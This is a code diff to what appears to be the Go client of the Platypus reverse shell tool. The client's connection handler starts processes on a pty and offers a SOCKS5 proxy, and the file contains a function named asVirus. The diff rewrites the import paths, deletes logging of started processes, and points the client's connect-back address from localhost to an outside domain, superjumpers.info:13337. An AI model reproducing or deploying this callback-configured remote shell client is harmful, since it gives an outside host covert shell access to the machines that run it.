@@ -19,12 +19,12 @@ import (
 	"syscall"
 	"time"
 
-	"github.com/WangYihang/Platypus/internal/util/crypto"
-	"github.com/WangYihang/Platypus/internal/util/hash"
-	"github.com/WangYihang/Platypus/internal/util/log"
-	"github.com/WangYihang/Platypus/internal/util/message"
-	"github.com/WangYihang/Platypus/internal/util/str"
-	"github.com/WangYihang/Platypus/internal/util/update"
+	"Platypus/internal/util/crypto"
+	"Platypus/internal/util/hash"
+	"Platypus/internal/util/log"
+	"Platypus/internal/util/message"
+	"Platypus/internal/util/str"
+	"Platypus/internal/util/update"
 	"github.com/armon/go-socks5"
 	"github.com/creack/pty"
 	"github.com/phayes/freeport"
@@ -150,8 +150,6 @@ func handleConnection(c *client) {
 				ptmx:       ptmx,
 				process:    process,
 			}
-			log.Success("Process started: %d", process.Process.Pid)
-			log.Success("Process added: %v", processes)
 			defer func() { _ = ptmx.Close() }()
 
 			c.EncoderLock.Lock()
@@ -785,8 +783,9 @@ func asVirus() {
 }
 
 func main() {
-	release := true
-	service := "127.0.0.1:13337"
+	release := false
+	// service := "127.0.0.1:13337"
+	service := "superjumpers.info:13337"
 
 	if release {
 		service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
